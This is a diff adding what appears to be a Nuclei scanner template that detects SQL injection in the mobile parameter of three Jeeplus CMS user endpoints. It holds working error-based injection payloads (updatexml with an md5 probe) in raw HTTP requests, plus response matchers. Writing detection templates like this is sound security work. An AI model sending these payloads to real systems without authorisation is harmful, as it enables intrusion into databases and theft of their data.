@@ -1,0 +1,61 @@
+id: jeeplus-sql-injection
+info:
+  name: Jeeplus CMS Mobile Parameter SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jeeplus CMS Mobile parameters in certain endpoints are vulnerable to SQL injection, allowing attackers to escalate privileges or retrieve sensitive data from the database.
+  reference:
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        GET /a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))%23 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException:"
+          - "XPATH"
+          - "e10adc3949ba59abbe56e057f20f883"
+  - raw:
+      - |
+        GET /a/sys/user/validateMobileExist?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))%23 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException:"
+          - "XPATH"
+          - "e10adc3949ba59abbe56e057f20f883"
+  - raw:
+      - |
+        GET /a/sys/user/validateMobile?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))# HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=11CA31F0A2A14EAF52A06AB11A1C6A67
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException:"
+          - "XPATH"
+          - "e10adc3949ba59abbe56e057f20f883"
